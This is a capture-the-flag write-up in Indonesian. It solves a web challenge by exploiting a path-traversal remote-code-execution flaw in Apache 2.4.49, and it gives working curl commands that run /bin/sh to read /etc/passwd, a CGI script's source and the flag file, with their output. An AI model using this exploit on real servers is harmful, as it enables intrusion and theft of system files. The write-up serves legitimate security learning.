## Free Boostrap Template

### Deskripsi

Sebuah template boostrap 5 gratis tis tis untuk kita semua, silah kan copas source codenya dan telusuri manfaatnya. [http://103.147.32.214:9003/](http://103.147.32.214:9003/)

### Solusi

setelah ditelusuri, terdapat 1 link dengan title [Click Me](http://103.147.32.214:9003/cgi-bin/blog.pl)yang mengarah pada halaman **Internal Server Error** dan jika di view source terdapat petunjuk

```
You need to read the blog.pl source code
to find out the flag location OR just use
your imagination....
```

point nya harus membaca source code dari file `blog.pl`, setelah dilihat-lihat respon dari server, yang menarik adalah server Apache yang digunakan

```
Server: Apache/2.4.49 (Unix)

```

Googling sedikit dengan keyword `apache 2.4.49 exploit``` hasilnya cukup untuk memberikan informasi apa yang harus dilakukan.


```
curl http://103.147.32.214:9003/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'C|echo;cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

selanjutnya membaca source code dari `blog.pl`

```
curl http://103.147.32.214:9003/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'C|echo;cat /usr/local/apache2/cgi-bin/blog.pl'

#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "you can find the flag under apache2 directory";
```

langkah terakhir hanya membaca flagnya

```
curl http://103.147.32.214:9003/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'C|echo;cat /usr/local/apache2/this_is_real_flag'
lastctf{r3m0t3_c0d3_3x3cut10n_us1n9_4p4ch3_vuln3r4b1l1ty}
```